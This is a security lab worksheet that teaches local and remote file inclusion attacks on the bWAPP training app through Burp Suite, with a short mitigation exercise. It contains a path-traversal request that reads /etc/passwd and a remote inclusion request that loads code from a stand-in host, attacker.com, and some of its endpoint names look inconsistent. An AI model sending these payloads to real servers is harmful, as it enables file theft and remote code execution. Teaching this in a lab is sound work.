# Project 5: Exploring File Inclusion Vulnerabilities using bWAPP

## Introduction
File Inclusion is a web security vulnerability that allows attackers to include files on a server through a web application. This vulnerability can lead to unauthorized access to sensitive files, remote code execution, and even full system compromise. In this project, you will learn how to identify and exploit File Inclusion vulnerabilities using bWAPP (Bee-box Web Application) and Burp Suite.

## Pre-requisites
- Basic understanding of web application concepts and the HTTP protocol.
- Familiarity with server-side scripting languages such as PHP.
- A working installation of bWAPP and Burp Suite Community Edition.

## Lab Set-up

### Setting up bWAPP
1. **Install XAMPP**:
   - Download XAMPP from [Apache Friends](https://www.apachefriends.org/index.html) and install it.
   - Start the Apache and MySQL services from the XAMPP control panel.

2. **Install bWAPP**:
   - Download bWAPP from [bWAPP's official website](http://www.itsecgames.com/).
   - Extract the bWAPP files into the `htdocs` directory of your XAMPP installation (e.g., `C:\xampp\htdocs\bWAPP`).

3. **Configure bWAPP Database**:
   - Open a web browser and navigate to `http://localhost/bWAPP/install.php`.
   - Follow the instructions to set up the bWAPP database.
   - Log in to bWAPP with the default credentials:
     ```
     Username: bee
     Password: bug
     ```

### Setting up Burp Suite
1. **Download and Install Burp Suite**:
   - Download Burp Suite Community Edition from [PortSwigger](https://portswigger.net/burp/communitydownload) and install it.

2. **Configure Burp Suite with your Browser**:
   - Open Burp Suite and go to the "Proxy" tab.
   - Click on "Intercept is on" button to toggle interception off.
   - Go to the "Options" sub-tab and ensure the proxy listener is running on 127.0.0.1:8080.
   - Configure your web browser to use Burp Suite as a proxy (set the proxy server to 127.0.0.1 and port 8080).

## Exercises

### Exercise 1: Identifying Local File Inclusion (LFI) Vulnerabilities

1. **Set bWAPP Security Level to Low**:
   - Log in to bWAPP and go to the "Choose your bug" section.
   - Set the security level to "low" and select "LFI (Local File Inclusion)" from the list of bugs.
   - Click "Hack".

2. **Navigate to LFI Page**:
   - You will be presented with a page that includes a file based on user input.

3. **Intercept the Request with Burp Suite**:
   - Enter a file path (e.g., `/etc/passwd`) and click "View file".
   - Burp Suite will intercept the request. Forward the request to see the result.

4. **Modify the Request to Exploit LFI**:
   - Intercept the request again and modify the `page` parameter to include a sensitive file path (e.g., `../../../../etc/passwd`).
   - Forward the modified request and observe the response.

### Commands and Expected Output

1. **Initial Request Interception**:
   - Request intercepted by Burp Suite:
     ```
     GET /bWAPP/rlfi.php?page=about.php HTTP/1.1
     Host: localhost
     ```

2. **Modified Request with LFI Exploit**:
   - Modify the intercepted request:
     ```
     GET /bWAPP/rlfi.php?page=../../../../etc/passwd HTTP/1.1
     Host: localhost
     ```
   - Expected output: The response should display the contents of the `/etc/passwd` file.

### Exercise 2: Exploiting Remote File Inclusion (RFI) Vulnerabilities

1. **Set bWAPP Security Level to Low**:
   - In bWAPP, select "RFI (Remote File Inclusion)" from the list of bugs.
   - Click "Hack".

2. **Navigate to RFI Page**:
   - You will be presented with a page that includes a remote file based on user input.

3. **Intercept the Request with Burp Suite**:
   - Enter a URL of a remote file (e.g., `http://attacker.com/malicious.php`) and click "Include".
   - Burp Suite will intercept the request. Forward the request to see the result.

4. **Verify Remote File Inclusion**:
   - Check if the contents of the remote file (`malicious.php`) are executed or included in the response.

### Commands and Expected Output

1. **Initial Request Interception**:
   - Request intercepted by Burp Suite:
     ```
     GET /bWAPP/rrfi.php?language=../../../../etc/passwd HTTP/1.1
     Host: localhost
     ```

2. **Modified Request with RFI Exploit**:
   - Modify the intercepted request:
     ```
     GET /bWAPP/rrfi.php?language=http://attacker.com/malicious.php HTTP/1.1
     Host: localhost
     ```
   - Expected output: The response should execute or include the contents of the remote file.

### Exercise 3: Mitigating File Inclusion Vulnerabilities

1. **Implementing Input Validation and File Whitelisting**:
   - Modify the application code (if you have access) to validate user input and only allow inclusion of specific files.

2. **Testing the Mitigation**:
   - After applying the mitigation, repeat the File Inclusion attempts and ensure they are no longer successful.

## Conclusion
By completing these exercises, you will gain hands-on experience in identifying and exploiting File Inclusion vulnerabilities using bWAPP and Burp Suite. Additionally, you will understand the importance of implementing input validation and file whitelisting to prevent File Inclusion attacks.
